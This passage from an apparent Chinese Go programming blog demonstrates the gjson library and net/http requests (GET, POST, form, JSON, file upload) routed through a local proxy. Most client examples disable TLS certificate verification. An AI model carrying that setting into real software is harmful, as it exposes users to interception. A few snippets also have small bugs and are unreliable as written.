js1.Test3&#123;<br>fmt.Println(val.Name)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="gjson"><a href="#gjson" class="headerlink" title="gjson"></a>gjson</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://github.com/tidwall/gjson<br><br>go get -u github.com/tidwall/gjson<br></code></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func jsonTest()&#123;<br>jsonData := `&#123;&quot;test1&quot;:&quot;1&quot;,&quot;test2&quot;:&quot;2&quot;,&quot;test3&quot;: &#123;&quot;name&quot;:&quot;admin&quot;,&quot;pass&quot;:&quot;123&quot;&#125;,&#123;&quot;name&quot;:&quot;test&quot;,&quot;pass&quot;:&quot;123&quot;&#125;&#125;`<br><br>value := gjson.Get(jsonData, &quot;test3&quot;).Get(&quot;name&quot;)<br>fmt.Println(value)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内嵌"><a href="#内嵌" class="headerlink" title="内嵌"></a>内嵌</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func jsonTest()&#123;<br>jsonData := `&#123;&quot;test1&quot;:&quot;1&quot;,&quot;test2&quot;:&quot;2&quot;,&quot;test3&quot;: [&#123;&quot;name&quot;:&quot;admin&quot;,&quot;pass&quot;:&quot;123&quot;&#125;,&#123;&quot;name&quot;:&quot;test&quot;,&quot;pass&quot;:&quot;123&quot;&#125;]&#125;`<br><br>value := gjson.Get(jsonData, &quot;test3&quot;)<br>fmt.Println(value)<br><br>value2 := gjson.Get(value.Array()[0].String(), &quot;name&quot;)<br>fmt.Println(value2)<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go net/http 库</title>
      <link href="/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/net_http/"/>
      <url>/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/net_http/</url>
      
        <content type="html"><![CDATA[<h1 id="net-http"><a href="#net-http" class="headerlink" title="net&#x2F;http"></a>net&#x2F;http</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">resp, err := http.Get(&quot;http://httpbin.org/&quot;)<br>resp, err := http.Post(&quot;http://httpbin.org/anything&quot;)<br></code></pre></td></tr></table></figure><h1 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h1><table><thead><tr><th>语法</th><th>描述</th></tr></thead><tbody><tr><td>resp.StatusCode</td><td>状态码</td></tr><tr><td>resp.Cookies()</td><td>Cookie</td></tr><tr><td>resp.Body</td><td>Body</td></tr><tr><td>resp.Header</td><td>Header</td></tr><tr><td>resp.Header.Get(“Content-Length”)</td><td>Header (不区分大小写)</td></tr><tr><td>resp.Headerp[“Content-Length”]</td><td>Header</td></tr><tr><td>resp.Proto</td><td>协议</td></tr><tr><td>resp.Status</td><td>状态 (200 OK)</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func Get(url string) (resp *Response, err error)<br>func Post(url string, contentType string, body io.Reader) (resp *Response, err error)<br>func PostForm(url string, data url.Values) (resp *Response, err error)<br>func NewRequest(method string, url string, body io.Reader)<br></code></pre></td></tr></table></figure><h1 id="Http-Transport"><a href="#Http-Transport" class="headerlink" title="Http.Transport"></a>Http.Transport</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func httpPostJson()&#123;<br>proxyUrl,_ := url.Parse(&quot;http://127.0.0.1:8080&quot;)<br>Tr := &amp;http.Transport&#123;<br>Proxy: http.ProxyURL(proxyUrl),// 设置代理<br>// 忽略证书验证<br>TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: true&#125;,<br>// 设置超时时间<br>DialContext: (&amp;net.Dialer&#123;<br>Timeout: 3000 * time.Millisecond,// 连接超时时间为 3000 毫秒<br>KeepAlive: 30 * time.Second,// 连接保持 30 秒<br>&#125;).DialContext,<br>// 空闲连接在连接池中的超时时间<br>IdleConnTimeout: 1 * time.Second,<br>// 发送完请求到接收到响应头的超时时间<br>ExpectContinueTimeout: 400 * time.Millisecond,<br>&#125;<br>client := &amp;http.Client&#123;Transport: Tr&#125;<br>resp,_ := client.Get(&quot;https://127.0.0.1&quot;)<br>body,_ := ioutil.ReadAll(resp.Body)<br><br>fmt.Println(string(body))<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="获取title"><a href="#获取title" class="headerlink" title="获取title"></a>获取title</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func getTitle(getUrl string) string&#123;<br>request, _ := http.NewRequest(http.MethodGet, getUrl, nil)<br><br>r, _ := http.DefaultClient.Do(request)<br>defer func()&#123;_ = r.Body.Close()&#125;()<br><br>content,_ := ioutil.ReadAll(r.Body)<br>//fmt.Println(string(content))<br>title := regexp.MustCompile(`&lt;title&gt;.+&lt;/title&gt;`).FindAllStringSubmatch(string(content), -1)<br>//fmt.Println(title[0][0])<br>return title[0][0]<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="自动添加头"><a href="#自动添加头" class="headerlink" title="自动添加头"></a>自动添加头</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func raw() ([]string,[]string)&#123;<br>var (<br>keyResult []string<br>valResult []string<br>)<br><br>requestInfo := `GET /sqli/ HTTP/1.1<br>Host: 192.168.1.1<br>Accept: text/plain, */*; q=0.01<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36<br>X-Requested-With: XMLHttpRequest<br>Referer: http://192.168.1.1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: PHPSESSID=db97ebr3aepndpscth8uq2e997<br>Connection: close<br><br>`<br>allInfo:= strings.Split(requestInfo, &quot;\n\n&quot;)<br>headers := strings.Split(allInfo[0], &quot;\n&quot;)<br><br>for _,i:= range(headers[1:])&#123;<br>key := strings.SplitN(i, &quot;:&quot;, 2)<br>keyResult = append(keyResult, key[0])<br>valResult = append(valResult, key[1])<br>&#125;<br>return keyResult,valResult<br>&#125;<br>func httpGetHeader()&#123;<br>key, val := raw()<br>request, _ := http.NewRequest(http.MethodGet, &quot;http://httpbin.org/get&quot;, nil)<br><br>for count,i := range(key)&#123;<br>request.Header.Add(i, val[count])<br>&#125;<br><br>r, _ := http.DefaultClient.Do(request)<br>defer func()&#123;_ = r.Body.Close()&#125;()<br><br>content,_ := ioutil.ReadAll(r.Body)<br>fmt.Println(string(content))<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;crypto/tls&quot;<br>&quot;fmt&quot;<br>&quot;io&quot;<br>&quot;mime&quot;<br>&quot;net/http&quot;<br>&quot;net/url&quot;<br>&quot;time&quot;<br><br>&quot;golang.org/x/text/encoding&quot;<br>&quot;golang.org/x/text/encoding/htmlindex&quot;<br>)<br><br>func main() &#123;<br>// 定义请求的目标 URL<br>questUrl := &quot;http://127.0.0.1&quot;<br><br>// 定义代理服务器的 URL，将请求通过代理发送<br>proxyUrl, _ := url.Parse(&quot;http://127.0.0.1:8080&quot;)<br><br>// 创建自定义的 HTTP 客户端<br>client := &amp;http.Client&#123;<br>// CheckRedirect 允许我们自定义 HTTP 重定向行为<br>CheckRedirect: func(req *http.Request, via []*http.Request) error &#123;<br>// 最多重定向2次<br>if len(via) &gt; 2 &#123;<br>// 不跟随 302 跳转，通过返回 ErrUseLastResponse 阻止<br>return http.ErrUseLastResponse<br>&#125;<br>return nil<br>&#125;,<br>// 设置请求超时时间为 3 秒<br>Timeout: 3 * time.Second,<br>Transport: &amp;http.Transport&#123;<br>// 忽略证书验证，通常在测试或者内部网络中使用，生产环境中慎用<br>TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: true&#125;,<br>// 使用代理服务器发送请求<br>Proxy: http.ProxyURL(proxyUrl),<br>&#125;,<br>&#125;<br><br>// 创建 GET 请求<br>req, err := http.NewRequest(&quot;GET&quot;, questUrl, nil)<br>if err != nil &#123;<br>// 如果创建请求失败，打印错误信息并退出程序<br>fmt.Println(&quot;创建请求失败:&quot;, err)<br>return<br>&#125;<br><br>// 设置 User-Agent 标头，模拟浏览器的请求<br>req.Header.Set(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;)<br><br>// 发送 HTTP 请求<br>response, err := client.Do(req)<br>if err != nil &#123;<br>// 如果请求失败，打印错误信息并退出程序<br>fmt.Println(&quot;请求失败:&quot;, err)<br>return<br>&#125;<br><br>// 使用 defer 延迟执行一个匿名函数，确保在函数退出前关闭 response.Body<br>defer func(Body io.ReadCloser) &#123;<br>_ = Body.Close() // 忽略 Close() 方法的错误，仅关心关闭操作的成功或失败<br>&#125;(response.Body)<br><br>// 获取响应的编码信息<br>contentType := response.Header.Get(&quot;Content-Type&quot;)<br>httpEncoding, _ := charsetFromContentType(contentType)<br><br>// 使用确定的编码重新读取响应内容<br>decodedBody := transformEncoding(httpEncoding, response.Body)<br><br>// 读取响应内容<br>body, err := io.ReadAll(decodedBody)<br>if err != nil &#123;<br>// 如果读取响应失败，打印错误信息并退出程序<br>fmt.Println(&quot;读取响应失败:&quot;, err)<br>return<br>&#125;<br><br>// 打印响应内容<br>fmt.Println(&quot;响应内容:&quot;)<br>fmt.Println(string(body))<br>&#125;<br><br>func charsetFromContentType(contentType string) (encoding.Encoding, error) &#123;<br>_, params, err := mime.ParseMediaType(contentType)<br>if err != nil &#123;<br>return nil, err<br>&#125;<br>charset, found := params[&quot;charset&quot;]<br>if !found &#123;<br>return nil, fmt.Errorf(&quot;charset not found in Content-Type&quot;)<br>&#125;<br>return htmlindex.Get(charset)<br>&#125;<br><br>func transformEncoding(encoding encoding.Encoding, r io.Reader) io.Reader &#123;<br>if encoding == nil &#123;<br>return r<br>&#125;<br>return encoding.NewDecoder().Reader(r)<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Post"><a href="#Post" class="headerlink" title="Post"></a>Post</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func Post(url string, contentType string, body io.Reader) (resp *Response, err error)<br></code></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func httpPost()&#123;<br>resp, err := http.Post(&quot;https://httpbin.org/post&quot;, &quot;&quot;, nil)<br>if err != nil&#123;panic(err)&#125;<br><br>content, err := ioutil.ReadAll(resp.Body)<br>if err != nil&#123;panic(err)&#125;<br>defer func()&#123;_=r.Body.Close()&#125;()<br><br>fmt.Println((string)(content))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func main() &#123;<br>questURL := &quot;https://httpbin.org/post&quot; // 注意，这里使用了一个接受POST请求的URL<br>proxyURL, _ := url.Parse(&quot;http://127.0.0.1:8080&quot;)<br><br>// 准备表单数据<br>formData := url.Values&#123;&#125;<br>formData.Set(&quot;key1&quot;, &quot;value1&quot;)<br>formData.Set(&quot;key2&quot;, &quot;value2&quot;)<br><br>// 创建自定义的HTTP客户端<br>client := &amp;http.Client&#123;<br>CheckRedirect: func(req *http.Request, via []*http.Request) error &#123;<br>// 不跟随 302 跳转<br>return http.ErrUseLastResponse<br>&#125;,<br>Timeout: 3 * time.Second, // 超时时间为3秒<br>Transport: &amp;http.Transport&#123;<br>// 忽略证书验证<br>TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: true&#125;,<br>// 代理地址<br>Proxy: http.ProxyURL(proxyURL),<br>&#125;,<br>&#125;<br><br>// 使用http.PostForm发送POST请求<br>response, err := client.PostForm(questURL, formData)<br>if err != nil &#123;<br>fmt.Println(&quot;请求失败:&quot;, err)<br>return<br>&#125;<br>defer func(Body io.ReadCloser) &#123;<br>_ = Body.Close()<br>&#125;(response.Body)<br><br>// 读取响应的内容<br>body, err := io.ReadAll(response.Body)<br>if err != nil &#123;<br>fmt.Println(&quot;读取响应失败:&quot;, err)<br>return<br>&#125;<br><br>// 打印响应内容<br>fmt.Println(&quot;响应内容:&quot;)<br>fmt.Println(string(body))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;bytes&quot;<br>&quot;crypto/tls&quot;<br>&quot;encoding/json&quot;<br>&quot;fmt&quot;<br>&quot;io&quot;<br>&quot;net/http&quot;<br>&quot;net/url&quot;<br>&quot;time&quot;<br>)<br><br>func main() &#123;<br>questURL := &quot;https://httpbin.org/post&quot; // 这是一个接受POST请求的URL<br>proxyURL, _ := url.Parse(&quot;http://127.0.0.1:8080&quot;)<br><br>// 准备JSON数据<br>data := map[string]string&#123;<br>&quot;key1&quot;: &quot;value1&quot;,<br>&quot;key2&quot;: &quot;value2&quot;,<br>&#125;<br>jsonData, err := json.Marshal(data)<br>if err != nil &#123;<br>fmt.Println(&quot;JSON编码失败:&quot;, err)<br>return<br>&#125;<br><br>// 创建自定义的HTTP客户端<br>client := &amp;http.Client&#123;<br>CheckRedirect: func(req *http.Request, via []*http.Request) error &#123;<br>// 不跟随 302 跳转<br>return http.ErrUseLastResponse<br>&#125;,<br>Timeout: 3 * time.Second, // 超时时间为3秒<br>Transport: &amp;http.Transport&#123;<br>// 忽略证书验证<br>TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: true&#125;,<br>// 代理地址<br>Proxy: http.ProxyURL(proxyURL),<br>&#125;,<br>&#125;<br><br>// 创建POST请求<br>req, err := http.NewRequest(&quot;POST&quot;, questURL, bytes.NewBuffer(jsonData))<br>if err != nil &#123;<br>fmt.Println(&quot;创建请求失败:&quot;, err)<br>return<br>&#125;<br><br>// 设置请求头为JSON格式<br>req.Header.Set(&quot;Content-Type&quot;, &quot;application/json&quot;)<br>// 设置User-Agent<br>req.Header.Set(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;)<br><br>// 发送请求<br>response, err := client.Do(req)<br>if err != nil &#123;<br>fmt.Println(&quot;请求失败:&quot;, err)<br>return<br>&#125;<br>defer func(Body io.ReadCloser) &#123;<br>_ = Body.Close()<br>&#125;(response.Body)<br><br>// 读取响应的内容<br>body, err := io.ReadAll(response.Body)<br>if err != nil &#123;<br>fmt.Println(&quot;读取响应失败:&quot;, err)<br>return<br>&#125;<br><br>// 打印响应内容<br>fmt.Println(&quot;响应内容:&quot;)<br>fmt.Println(string(body))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;bytes&quot;<br>&quot;crypto/tls&quot;<br>&quot;fmt&quot;<br>&quot;io&quot;<br>&quot;mime/multipart&quot;<br>&quot;net/http&quot;<br>&quot;net/url&quot;<br>&quot;os&quot;<br>&quot;time&quot;<br>)<br><br>func main() &#123;<br>questURL := &quot;https://httpbin.org/post&quot; // 这是一个接受POST请求的URL<br>proxyURL, _ := url.Parse(&quot;http://127.0.0.1:8080&quot;)<br><br>// 准备要上传的文件<br>filePath := &quot;F:/tmp/111.txt&quot; // 请将文件路径替换为实际文件路径<br>file, err := os.Open(filePath)<br>if err != nil &#123;<br>fmt.Println(&quot;打开文件失败:&quot;, err)<br>return<br>&#125;<br>defer func(file *os.File) &#123;<br>_ = file.Close()<br>&#125;(file)<br><br>// 创建自定义的HTTP客户端<br>client := &amp;http.Client&#123;<br>CheckRedirect: func(req *http.Request, via []*http.Request) error &#123;<br>// 不跟随 302 跳转<br>return http.ErrUseLastResponse<br>&#125;,<br>Timeout: 3 * time.Second, // 超时时间为3秒<br>Transport: &amp;http.Transport&#123;<br>// 忽略证书验证<br>TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: true&#125;,<br>// 代理地址<br>Proxy: http.ProxyURL(proxyURL),<br>&#125;,<br>&#125;<br><br>// 创建POST请求<br>body := new(bytes.Buffer)<br>writer := multipart.NewWriter(body)<br>part, err := writer.CreateFormFile(&quot;file&quot;, &quot;111.txt&quot;) // 使用&quot;file&quot;作为表单字段名，&quot;111.txt&quot;是文件名<br>if err != nil &#123;<br>fmt.Println(&quot;创建表单字段失败:&quot;, err)<br>return<br>&#125;<br>_, err = io.Copy(part, file)<br>if err != nil &#123;<br>fmt.Println(&quot;拷贝文件数据失败:&quot;, err)<br>return<br>&#125;<br><br>// 关闭multipart.Writer以写入结尾<br>_ = writer.Close()<br><br>req, err := http.NewRequest(&quot;POST&quot;, questURL, body)<br>if err != nil &#123;<br>fmt.Println(&quot;创建请求失败:&quot;, err)<br>return<br>&#125;<br><br>// 设置请求头为multipart/form-data<br>req.Header.Set(&quot;Content-Type&quot;, writer.FormDataContentType())<br>// 设置User-Agent<br>req.Header.Set(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;)<br><br>// 发送请求<br>response, err := client.Do(req)<br>if err != nil &#123;<br>fmt.Println(&quot;请求失败:&quot;, err)<br>return<br>&#125;<br>defer func(Body io.ReadCloser) &#123;<br>_ = Body.Close()<br>&#125;(response.Body)<br><br>// 读取响应的内容<br>respBody, err := io.ReadAll(response.Body)<br>if err != nil &#123;<br>fmt.Println(&quot;读取响应失败:&quot;, err)<br>return<br>&#125;<br><br>// 打印响应内容<br>fmt.Println(&quot;响应内容:&quot;)<br>fmt.Println(string(respBody))<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func NewRequest(method string, url string, body io.Reader)<br></code></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func httpPut()&#123;<br>request, err := http.NewRequest(http.MethodPut, &quot;https://httpbin.org/put&quot;, nil)<br>if err != nil&#123;<br>panic(err)<br>&#125;<br>// 执行<br>r, err := http.DefaultClient.Do(request)<br>if err != nil&#123;<br>panic(err)<br>&#125;<br>defer func() &#123;_ = r.Body.Close()&#125;()<br>content, err := ioutil.ReadAll(r.Body)<br>if err != nil&#123;<br>panic(err)<br>&#125;<br>fmt.Println((string)(content))<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="自动设置编码"><a href="#自动设置编码" class="headerlink" title="自动设置编码"></a>自动设置编码</h1><figure class="highlight plaintext"><table><tr><td 